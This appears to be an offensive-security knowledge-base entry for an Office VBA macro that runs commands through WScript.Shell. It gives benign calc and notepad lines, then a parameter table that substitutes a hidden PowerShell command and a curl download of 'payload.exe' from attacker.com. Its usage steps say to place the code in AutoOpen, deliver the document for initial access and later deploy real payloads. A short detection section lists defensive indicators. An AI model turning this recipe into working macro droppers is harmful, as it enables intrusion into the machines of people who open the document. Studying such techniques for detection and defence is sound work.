---
id: c1236dfa-4d24-4a9f-b560-fa3cda626332
type: code
language: VBA
verified: true
created_at: '2023-04-06T03:56:23.475437+00:00'
updated_at: '2023-04-10T20:36:50.439372+00:00'
platforms:
  - Windows
tags:
  - office-macro
  - vba-execution
  - wscript-shell
validated: true
---

# VBA-Macro-Open-Calc-and-Notepad-via-Wscript

## Code

```vba
CreateObject("WScript.Shell").Run "calc.exe"
CreateObject("WScript.Shell").Exec "notepad.exe"
```

## Description

This VBA code snippet directly instantiates Wscript.Shell objects to execute calc.exe using the Run method (for windowed or hidden execution) and notepad.exe using Exec (for process control and potential stdout capture). It demonstrates multi-command execution in a macro, ideal for chaining benign tests to malicious actions like file downloads or network connections.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| "calc.exe" | First command to execute via Run | "powershell.exe -WindowStyle Hidden -Command ..." |
| "notepad.exe" | Second command to execute via Exec | "cmd.exe /c curl -o payload.exe http://attacker.com/payload.exe" |

## Usage

Insert this code into an AutoOpen subroutine in an Office VBA module. For example: Sub AutoOpen() [code here] End Sub. Save and deliver the document. The Run method hides windows if specified (e.g., Run "cmd.exe", 0), while Exec allows reading output. Use in procedures for initial access to test macro execution before deploying real payloads.

## Detection

- Look for rapid spawning of multiple processes (e.g., calc.exe and notepad.exe) from Office executables.
- Enable PowerShell and script block logging to detect chained executions.
- Behavioral analytics in SIEM for unusual Wscript.Shell COM invocations from Office.
- Document scanners should flag direct CreateObject calls to WScript.Shell.

## Related

- [[procedures/Office-VBA-Wscript-Execution]]
